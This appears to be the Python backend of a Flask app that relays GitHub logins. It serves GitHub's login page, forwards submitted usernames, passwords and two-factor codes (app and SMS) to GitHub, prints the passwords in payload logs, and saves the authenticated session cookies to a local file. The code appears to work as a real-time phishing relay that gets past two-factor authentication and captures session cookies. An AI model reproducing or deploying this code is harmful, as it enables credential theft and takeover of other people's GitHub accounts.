import requests
from bs4 import BeautifulSoup
import uuid
from flask import session as flask_session  # Flask session

# Rename the requests session to avoid conflict with flask_session
req_session = requests.Session()
req_session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Accept-Language": "en-US,en;q=0.5"
})


def save_cookies_to_file():
    """Save cookies from req_session to a file."""
    with open("cookies.txt", "w") as f:
        for cookie in req_session.cookies:
            f.write(f"{cookie.name}={cookie.value}\n")


def load_cookies_from_file():
    """Load cookies from a file into req_session."""
    try:
        with open("cookies.txt", "r") as f:
            for line in f:
                name, value = line.strip().split("=", 1)
                req_session.cookies.set(name, value)
    except FileNotFoundError:
        print("No cookies file found. Starting with a fresh session.")


def get_login_page():
    response = req_session.get("https://github.com/login")
    html = response.text

    # Use the HTML text from the response instead of the response object
    soup = BeautifulSoup(html, "html.parser")
    token_input = soup.find("input", {"name": "authenticity_token"})

    # Save the token value in Flask's session (assuming we're inside a Flask context)
    if token_input and token_input.has_attr("value"):
        flask_session["authenticity_token"] = token_input["value"]

    # Modify form action if necessary
    form = soup.find("form")
    if form and form.get("action") == "/session":
        form["action"] = "/session"

    return str(soup)


def perform_login(username, password):
    # Retrieve the previously stored authenticity token from Flask's session
    token = flask_session.get("authenticity_token")
    if not token:
        return "Missing authenticity token.", "error"

    flask_session["device_id"] = str(uuid.uuid4())

    payload = {
        "authenticity_token": token,
        "login": username,
        "password": password,
        "webauthn-support": "supported",
        "webauthn-iuvpaa-support": "unsupported",
        "return_to": "",
        "allow_signup": "",
        "device_id": flask_session.get("device_id"),
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://github.com/login",
        "Origin": "https://github.com",
    }

    print(f"Submitting Login Request with Payload: {payload}")
    print(f"Headers Sent: {headers}")
    print(f"Session Cookies Before Login: {req_session.cookies.get_dict()}")

    post_resp = req_session.post("https://github.com/session", data=payload, headers=headers)
    html = post_resp.text

    save_cookies_to_file()

    cookies = req_session.cookies.get_dict()
    print(f"Session Cookies After Login: {cookies}")

    already_logged_in = cookies.get("logged_in", "no") == "yes"

    if already_logged_in:
        return html, "success", cookies
    elif "/sessions/two-factor" in post_resp.url or "two-factor" in html:
        return html, "2fa", cookies
    else:
        return html, "invalid", cookies


def perform_2fa():
    """
    Handles the 2FA submission using the code provided by the user.
    It requests the 2FA app page after login to fetch the form or QR code page.
    """
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": "https://github.com/sessions/two-factor",
        "Origin": "https://github.com",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.5",
    }

    print(f"Headers Sent for 2FA: {headers}")
    print(f"Session Cookies Before 2FA: {req_session.cookies.get_dict()}")

    response = req_session.get("https://github.com/sessions/two-factor/app", headers=headers)
    print(f"2FA Response Status Code: {response.status_code}")
    print(f"2FA Response HTML: {response.text[:500]}")  # Print the first 500 characters for debugging

    save_cookies_to_file()

    # Parse the response to update the authenticity_token if needed
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "authenticity_token"})
    if token_input and token_input.has_attr("value"):
        flask_session["authenticity_token"] = token_input["value"]
        print(f"Updated Authenticity Token: {flask_session['authenticity_token']}")
    else:
        print("Error: Could not find authenticity token in 2FA response.")

    return response.text

def forward_sms():
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "text/html,application/xhtml+xml,application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3",
        "Referer": "https://github.com/sessions/two-factor/webauthn",
        "Origin": "https://github.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Turbo-Visit": "true",
        "X-React-App-Name": "rails",
    }

    # Ensure req_session has been authenticated successfully before this call
    print("Session cookies:", req_session.cookies.get_dict())

    response = req_session.get(
        "https://github.com/sessions/two-factor/sms/confirm", headers=headers
    )
    save_cookies_to_file()

    # Check if we got a proper HTML response or if it's a redirect or error page
    if response.status_code != 200:
        print("Error: Received status code", response.status_code)
        return f"Error: {response.status_code}"

    # Parse the response to update the authenticity_token if needed
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "authenticity_token"})
    if token_input and token_input.has_attr("value"):
        flask_session["authenticity_token"] = token_input["value"]

    return response.text


def execute_2fa_otp(app_otp: int, field_name: str):
    token = flask_session.get("authenticity_token")
    if not token:
        print("Error: Missing authenticity token.")
        return "Missing authenticity token.", "error", {}

    payload = {
        "authenticity_token": token,
        field_name: app_otp,  # Use "app_otp" or "sms_otp" based on the field_name
        "webauthn-support": "supported",
        "webauthn-iuvpaa-support": "unsupported",
        "return_to": "",
        "allow_signup": "",
        "device_id": flask_session.get("device_id"),
    }

    print(f"Submitting OTP with Payload: {payload}")
    print(f"Session Cookies Before OTP Submission: {req_session.cookies.get_dict()}")
    print(f"Authenticity Token: {token}")

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": "https://github.com/sessions/two-factor",
        "Origin": "https://github.com",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    post_resp = req_session.post("https://github.com/sessions/two-factor", data=payload, headers=headers)
    print(f"OTP Response Status Code: {post_resp.status_code}")
    print(f"OTP Response HTML: {post_resp.text[:500]}")  # Print the first 500 characters for debugging

    soup = BeautifulSoup(post_resp.text, "html.parser")
    page_title = soup.title.string.strip()  # Extract and clean the title

    if page_title == "GitHub":
        return post_resp.text, "success", req_session.cookies.get_dict()
    elif page_title == "Two-factor authentication · GitHub":
        return post_resp.text, "failure", req_session.cookies.get_dict()
    else:
        return post_resp.text, "unknown", req_session.cookies.get_dict()

def send_sms(authenticity_token, resend):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "text/html,application/xhtml+xml,application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://github.com/sessions/two-factor/sms/confirm",
        "Origin": "https://github.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }

    payload = {
        "authenticity_token": authenticity_token,
        "resend": resend,
    }

    print(f"Sending SMS 2FA Request with Payload: {payload}")
    print(f"Headers Sent for SMS 2FA: {headers}")

    response = req_session.post(
        "https://github.com/sessions/two-factor/sms/confirm", headers=headers, data=payload
    )
    save_cookies_to_file()

    print(f"SMS 2FA Response Status Code: {response.status_code}")
    print(f"SMS 2FA Response HTML: {response.text[:500]}")  # Print the first 500 characters
    print(f"Session Cookies After SMS 2FA Request: {req_session.cookies.get_dict()}")

    if response.status_code != 200:
        print("Error: Received status code", response.status_code)
        return f"Error: {response.status_code}"

    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "authenticity_token"})
    if token_input and token_input.has_attr("value"):
        flask_session["authenticity_token"] = token_input["value"]
        print(f"Updated Authenticity Token: {flask_session['authenticity_token']}")
    else:
        print("Error: Could not find authenticity token in SMS 2FA response.")

    return response.text